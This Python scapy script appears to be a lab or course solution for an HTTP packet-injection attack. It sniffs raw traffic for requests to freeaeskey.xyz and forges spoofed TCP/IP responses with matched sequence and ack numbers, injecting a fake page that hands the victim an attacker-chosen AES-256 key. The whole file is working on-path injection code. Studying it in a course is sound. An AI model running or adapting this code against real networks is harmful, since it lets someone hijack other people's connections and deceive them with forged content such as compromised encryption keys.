#!/usr/bin/python3

import scapy
from scapy.layers.http import HTTPResponse, HTTPRequest
import scapy.packet as packet
from scapy.all import *
from scapy.utils import *

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    # The strategy is to try to make everything an HTTP request, and any packets
    # that are not will be ignored.
    http_packet = None
    try:
        http_packet = HTTPRequest(pkt)
    except:
        return # Not an HTTP request. Ignore the packet.

    if http_packet.Host != None:
        host = http_packet.Host.decode('iso-8859-1')

        if host != 'freeaeskey.xyz':
            return

        # Get packet layers
        ether = Ether(pkt)
        ip_layer = ether[IP]
        tcp_layer = ether[TCP]

        # Get information from IP layer
        source = ip_layer.src
        destination = ip_layer.dst
        time_to_live = ip_layer.ttl

        print("Source: {}, Destination: {}, Time: {}".format(source, destination, time_to_live))

        # Get information from tcp layer
        sequence_number = tcp_layer.seq
        acknowledgement = tcp_layer.ack
        source_port = tcp_layer.sport
        dest_port = tcp_layer.dport
        flags = tcp_layer.flags

        print("Sequence Number: {}, Ack number: {}, Source port: {}, Destination port: {}".format(sequence_number, acknowledgement, source_port, dest_port))

        # Construct http layer
        payload="""<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>"""
        separator = "\x0d\x0a"
        http_head = "HTTP/1.1 200 OK"
        date="Date: " + time.strftime("%a, %d %Y %T GMT+7")
        content_Type="Content-Type: text/html; charset=UTF-8"
        content_Length="Content-Length: " + str(len(payload))

        http_data = [http_head, date, content_Type, content_Length, separator]
        spoof_http_layer = separator.join(http_data)

        # Construct the tcp and ip layers
        spoof_ack = sequence_number + len(spoof_http_layer)
        spoof_ip_layer = IP(dst=source, src=destination, ttl=time_to_live)
        spoof_tpc_layer = TCP(seq=acknowledgement, sport=dest_port, dport=source_port, ack=spoof_ack, flags=flags)

        # Build entire packet
        packet = spoof_ip_layer/spoof_tpc_layer/spoof_http_layer/payload

        inject_pkt(packet)

def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
